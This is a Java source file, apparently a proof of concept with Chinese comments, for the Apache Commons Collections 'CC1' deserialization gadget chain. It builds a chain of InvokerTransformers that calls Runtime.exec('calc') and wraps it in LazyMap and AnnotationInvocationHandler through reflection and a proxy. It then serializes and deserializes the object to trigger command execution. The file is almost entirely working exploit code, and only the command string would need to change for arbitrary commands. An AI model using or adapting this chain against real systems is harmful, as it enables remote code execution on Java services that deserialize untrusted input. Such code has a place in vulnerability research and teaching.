package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import sun.misc.ProxyGenerator;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class Cc1Poc {

    public static void main(String[] args) throws Exception {
        // 攻击链
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        // 目标对象
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap, chainedTransformer);

        // 构造调用处理器,自定义或者使用已存在的调用处理器。
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        /* 将此对象的可访问标志设置为指定的布尔值。
         * true值表示反射对象在使用时应该抑制Java语言访问检查。
         * 值为false表示反射的对象应该强制执行Java语言访问检查。
         * */
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        // 代理对象
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);

        // 实现利用链触发
        InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);

        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(handler1);
        oos.flush();
        oos.close();
        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    /**
     * 生成代理类方法
     * @param className  代理类名字
     * @param interfaces 被代理类接口
     * @throws IOException
     */
    public static void saveProxyObject(String className, Class[] interfaces, String path) throws IOException {
        byte[] classFile = ProxyGenerator.generateProxyClass(className, interfaces.getClass().getInterfaces());
        FileOutputStream out = new FileOutputStream(path);
        out.write(classFile);
        out.flush();
    }
}
